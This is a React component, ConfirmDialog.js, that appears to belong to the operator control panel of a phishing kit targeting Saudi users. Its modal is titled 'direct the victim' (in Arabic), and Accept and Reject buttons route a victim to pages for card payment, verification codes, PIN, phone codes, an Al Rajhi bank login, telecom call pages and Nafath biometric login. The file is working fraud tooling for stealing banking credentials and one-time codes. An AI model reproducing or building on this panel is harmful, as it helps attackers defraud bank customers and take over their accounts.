// src/components/ConfirmDialog.js
import React from "react";
import { Modal, Button } from "react-bootstrap";

const LABELS = {
  "index.html": "الصفحة الرئيسية",
  "vehicle.html": "بيانات السيارة",
  "insurance.html": "اختيار التأمين",
  "addons.html": "الإضافات",
  "summary.html": "الملخص",
  "paymen.html": "الدفع",
  "verify.html": "رمز التحقق",
  "pin.html": "PIN الماده",
  "phone.html": "رقم الهاتف",
  "phonecode.html": "رمز الهاتف",
  "rajhi.html": "تسجيل الراجحي",
  "stcCall.html": "STC Call",
  "mobilyCall.html": "Mobily Call",
  "nafad-basmah.html": "نفاذ بصمة",
};

export default function ConfirmDialog({ show, page, onConfirm, onDecline, onClose }) {
  if (!show) return null;
  return (
    <Modal show={show} onHide={onClose} centered backdrop="static">
      <Modal.Header>
        <Modal.Title>توجيه الضحية</Modal.Title>
        <Button variant="link" onClick={onClose} style={{ fontSize: "1.5rem", lineHeight: 1 }}>×</Button>
      </Modal.Header>
      <Modal.Body className="text-center py-4">
        <p className="mb-4">
          توجيه إلى: <strong>{LABELS[page] || page}</strong>
        </p>
        <Button variant="success" onClick={onConfirm} className="mx-2 px-4">
          ✅ قبول
        </Button>
        <Button variant="danger" onClick={onDecline} className="mx-2 px-4">
          ❌ رفض
        </Button>
      </Modal.Body>
    </Modal>
  );
}
